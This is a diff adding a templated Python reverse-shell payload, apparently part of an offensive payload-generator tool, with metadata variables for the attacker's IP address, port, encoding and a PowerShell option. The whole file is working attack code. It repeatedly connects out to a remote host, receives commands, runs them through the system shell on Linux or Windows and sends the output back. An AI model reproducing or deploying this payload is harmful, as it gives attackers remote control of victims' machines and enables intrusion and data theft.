@@ -1,0 +1,92 @@
+#!name##PyRevTcp
+#!itemType##payload
+#!lang##python
+#!info##A reverse shell written in Python, compatible with both Linux and Windows. It executes commands in standard system shells, and when targeting Windows you can switch the shell to PowerShell. The code is larger than the basic pipe-based implementation and is slightly more advanced.
+#!itemTags##LW##PyS
+#!Var##PRT_ip##$IP_ADDR##Host ip address##str
+#!Var##PRT_port##4444##Host port number##str
+#!Var##PRT_encode##$SOCKET_ENCODE##Socket data encoding##str
+#!Var##PRT_pause##3##Pause in sec between connect attempt.##str
+#!Var##PRT_power_shell##True##Setting this option to 'True' switches the default Windows shell to PowerShell. Using this option on Linux will cause an error.##str
+#!modProcess##BUILD_CODE
+
+{% if PRT_power_shell == "True" or PRT_power_shell == True %}
+    {% set PRT_extra_cmd = "powershell " %}
+{% else %}
+    {% set PRT_extra_cmd = "" %}
+{% endif %}
+
+import socket
+import subprocess
+import os
+from time import sleep
+
+
+class ReverseTcp:
+    def __init__(self):
+        self.format_encode = "{{PRT_encode}}"
+        self.raw_len = 1024
+        self.ps = "{{PRT_extra_cmd}}"
+    
+    def connect(self):
+        try:
+            self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.client.connect(("{{PRT_ip}}", {{PRT_port}}))
+            return True
+        except:
+            return False
+    
+    def recive_data(self):
+        msg = b""
+        while True:
+            try:
+                recv = self.client.recv(self.raw_len)
+            except:
+                return None
+            if recv:
+                if len(recv) < self.raw_len:
+                    msg += recv
+                    return msg.decode(self.format_encode)
+                else:
+                    msg += recv
+            else:
+                return None
+    
+    def send_msg(self, data):
+        try:
+            data = data.encode(self.format_encode)
+            self.client.send(data)
+        except:
+            pass
+    
+    def execute_cmd(self, cmd):
+        if cmd.startswith("cd "):
+            try:
+                os.chdir(cmd[3:])
+                self.send_msg(f"Change directory: {os.getcwd()}")
+            except Exception as e:
+                self.send_msg(f"ERROR: {e}")
+        try:
+            out = subprocess.run(f"{self.ps}{cmd}", capture_output=True, shell=True, text=True)
+        except:
+            o = f"Error: {e}"
+        if out.returncode == 0:
+            o = out.stdout
+        else:
+            o = out.stderr
+        self.send_msg(o)
+    
+    def start(self):
+        while True:
+            if not self.connect():
+                sleep({{PRT_pause}})
+                continue
+            self.send_msg(f"Reverse Shell start. Path: {os.getcwd()}")
+            while True:
+                cmd = self.recive_data()
+                if not cmd:
+                    break
+                self.execute_cmd(cmd)
+
+ReverseTcp().start()
+
